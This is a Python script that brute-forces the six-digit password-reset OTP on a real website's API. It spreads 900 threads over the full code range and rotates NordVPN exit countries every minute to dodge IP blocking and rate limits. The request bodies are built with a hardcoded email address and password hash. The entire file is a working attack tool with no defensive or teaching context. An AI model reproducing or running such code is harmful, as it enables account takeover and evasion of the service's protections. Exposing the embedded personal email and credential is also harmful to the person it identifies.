import datetime
import json
import random
import subprocess
import sys
import threading
import time
import os
import requests

success_otp = None
attempt_count = [0] * 1000
http_timeout_count = 0
http_conn_err_count = 0
switch_op_on = False
nordvpn_server_list = ['Albania', 'Argentina', 'Australia', 'Austria', 'Belgium', 'Brazil', 'Bulgaria', 'Canada',
                       'Chile', 'Colombia', 'Costa Rica', 'Croatia', 'Cyprus', 'Denmark', 'Estonia', 'Finland',
                       'France',
                       'Georgia', 'Germany', 'Greece', 'Hong Kong', 'Hungary', 'Iceland', 'Israel', 'Italy', 'Japan']


def httpGetRequest(url):
    httpReq = requests.get(url,
                           headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Linux; Android '
                                                                                      '11; SM-M025F '
                                                                                      'Build/RP1A.200720.012; wv) '
                                                                                      'AppleWebKit/537.36 (KHTML, '
                                                                                      'like Gecko) Version/4.0 '
                                                                                      'Chrome/103.0.5060.71 Mobile '
                                                                                      'Safari/537.36 uni-app ('
                                                                                      'Immersed/25.714285)'})
    if httpReq.status_code == 200:
        return httpReq.content.decode()
    return httpReq.status_code


def toJsonObject(jsonStr):
    try:
        jsonObj = json.loads(jsonStr)
        return jsonObj
    except json.JSONDecodeError as e:
        return None


def getPublicIp():
    jsonIp = httpGetRequest('https://api.ipify.org/?format=json')
    if not isinstance(jsonIp, str):
        return None
    return toJsonObject(jsonIp)['ip']


def getCountryByIp(ipAddr):
    ipData = httpGetRequest('https://ipapi.co/' + ipAddr + '/json')
    if not isinstance(ipData, str):
        return None
    return toJsonObject(ipData)['country_name']


def executeCommand(cmd):
    subprocess.run(cmd, cwd='C:\\Program Files\\NordVPN\\', shell=True)


def nordDisconnect():
    index = 0
    while True:
        executeCommand('NordVpn.exe --disconnect')
        index += 1
        time.sleep(5)
        country = None
        while True:
            try:
                country = getCountryByIp(getPublicIp())
                break
            except requests.exceptions.ConnectionError:
                continue
        if country == 'Sri Lanka':
            return True

        if index == 2:
            return False


def nordConnect(countryGrp):
    index = 0
    while True:
        executeCommand('NordVpn.exe -c -g \"' + countryGrp + '\"')
        index += 1
        time.sleep(5)
        country = None
        while True:
            try:
                country = getCountryByIp(getPublicIp())
                break
            except requests.exceptions.ConnectionError:
                continue
        if country == countryGrp:
            return True

        if index == 5:
            return False


def printAt(x, y, in_str):
    print("\033[" + str(y) + ";" + str(x) + "H" + in_str)


def generateProtoBufData(otp, email, password):
    req_head_bytes = b'\x1A\x06'
    byte_otp = otp.encode()
    otp_split = b'\x22\x20'
    byte_passwd = password.encode()
    password_split = b'\x28\x02\x32\x20'
    byte_email = email.encode()

    return req_head_bytes + byte_otp + otp_split + byte_passwd + password_split + byte_email


def attemptReset(otp, x, y, tid):
    global success_otp
    global http_timeout_count
    global http_conn_err_count

    http_head = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
        "Accept": "*/*",
        "Accept-Language": "",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-protobuf",
        "X-Version": "1.0.0",
        "X-Device-Type": "4",
        "X-Imei": "H5",
        "Authorization": "",
        "Content-Length": "78",
        "Origin": "https://777.in",
        "Dnt": "1",
        "Referer": "https://777.in/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers"
    }

    reset_req = None
    p_data = generateProtoBufData(str(otp), 'danushka.ekanayake.250@gmail.com', 'acd6bcf2b5ff76822a2b347787eaf464')
    while True:
        if switch_op_on:
            continue

        try:
            reset_req = requests.post('https://777.in/api/v2/base/forget',
                                      headers=http_head,
                                      data=p_data)
            break
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout) as ex:
            if isinstance(ex, requests.exceptions.ReadTimeout):
                http_timeout_count += 1
            elif isinstance(ex, requests.exceptions.ConnectionError):
                http_conn_err_count += 1
            continue
    attempt_count[tid] = attempt_count[tid] + 1
    printAt(x, y, '%s [%s]' % (str(otp), str(reset_req.status_code)))
    if b"Invalid" not in reset_req.content:
        success_otp = otp
        sys.exit(0)


def bruteForce(st_idx, end_idx, out_x, out_y, thr_id):
    while st_idx < end_idx:
        if success_otp is not None:
            sys.exit(0)
        # printAt(out_x, out_y, str(start_index))
        attemptReset(st_idx, out_x, out_y, thr_id)
        st_idx += 1


def calculateTermPos():
    pos_dict = {}
    for a in range(0, 80):
        pos_dict[a] = [0, a]

    for b in range(80, 160):
        pos_dict[b] = [25, b - 80]

    for c in range(160, 240):
        pos_dict[c] = [50, c - 160]

    for d in range(240, 320):
        pos_dict[d] = [75, d - 240]

    for e in range(320, 400):
        pos_dict[e] = [100, e - 320]

    for g in range(400, 480):
        pos_dict[g] = [125, g - 400]

    for h in range(480, 560):
        pos_dict[h] = [150, h - 480]

    for j in range(560, 640):
        pos_dict[j] = [175, j - 560]

    for k in range(640, 720):
        pos_dict[k] = [200, k - 640]

    for m in range(720, 800):
        pos_dict[m] = [225, m - 720]

    for n in range(800, 880):
        pos_dict[n] = [250, n - 800]

    for o in range(880, 960):
        pos_dict[o] = [275, o - 880]

    for p in range(960, 1000):
        pos_dict[p] = [300, p - 960]

    return pos_dict


if __name__ == "__main__":
    country = getCountryByIp(getPublicIp())
    os.system("")
    os.system("cls")
    trm_pos = calculateTermPos()
    cal = 0
    for itm in trm_pos:
        pos = trm_pos.get(itm)
        printAt(pos[0], pos[1] + 1, 'TID#%s' % cal)
        cal += 1

    thr_list = []
    thr_index = 0
    for i in range(100000, 1000000, 1000):
        out_pos = trm_pos.get(thr_index)
        start_index = i
        end_index = i + 1000
        thr = threading.Thread(target=bruteForce, args=(start_index, end_index, out_pos[0] + 10, out_pos[1] + 1,
                                                        thr_index))
        thr.start()
        thr_list.append(thr)
        thr_index += 1

    start_time = datetime.datetime.now()
    nord_time = time.time()
    while True:
        if success_otp is None:
            at_c = 0
            for tac in attempt_count:
                at_c += tac

            if (time.time() - nord_time) > (59 * 1):
                switch_op_on = True
                nord_time = time.time()
                printAt(0, 83, 'Switching servers...')
                nordDisconnect()
                printAt(0, 83, 'Old connection disconnected...')
                nord_country = random.choice(nordvpn_server_list)
                while True:
                    printAt(0, 83, 'Attempting Connection: %s' % nord_country)
                    if not nordConnect(nord_country):
                        continue
                    switch_op_on = False
                    break

            printAt(0, 85, 'Total Attempts: %s' % at_c)
            printAt(0, 86,
                    'Brute-forcing started at %s [Elapsed Time (min) : %s min(s)]' % (start_time.strftime('%Y-%m-%d '
                                                                                                          '%H:%M:%S'),
                                                                                      '{:.2f}'.format((
                                                                                              datetime.datetime.now() -
                                                                                              start_time)
                                                                                      .total_seconds() / 60.0)))
            printAt(0, 87, 'Total Read Timeout(s): %s' % http_timeout_count)
            printAt(0, 88, 'Total Connection Timeout(s): %s' % http_conn_err_count)
            continue
        break

    printAt(0, 86, 'SUCCESS : [OTP : %s]' % success_otp)
    sys.exit(0)
